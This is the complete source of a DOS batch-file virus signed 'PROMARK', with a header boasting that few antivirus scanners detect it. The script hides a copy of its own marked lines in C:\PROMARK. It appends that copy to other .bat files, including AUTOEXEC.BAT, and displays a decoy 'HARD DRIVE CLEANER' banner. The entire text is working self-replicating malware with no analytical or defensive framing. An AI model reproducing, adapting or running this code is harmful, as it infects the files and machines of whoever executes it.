REM CODED BY PROMARK (AVP AND FPROT ONLY HAS THIS SAMPLE OR MAYBE NOT)
@echo off%[PROMARK]%
echo.|date|find "20">nul%[PROMARK]%
if errorlevel 1 goto PROMARK1
echo HARD DRIVE CLEANER 1.0
::echo °¹  ™Í&Í>PROMARK.COM
::PROMARK
:PROMARK1 [6A
if exist C:\PROMARK goto PROMARK2
if not exist %0.bat goto PROMARK
find "PROMARK"<%0.bat>C:\PROMARK
attrib C:\PROMARK +h
:PROMARK2 [5A
set PROMARK=C:\AUTOEXEC.BAT
for %%f in (D:*.bat C:*.bat ..\*.bat) do set PROMARK=%%f
if not exist %PROMARK% goto PROMARK
find /i "PROMARK"<%PROMARK%>nul
if errorlevel 1 type C:\PROMARK>>%PROMARK%
set PROMARK=
:PROMARK [7A[0m
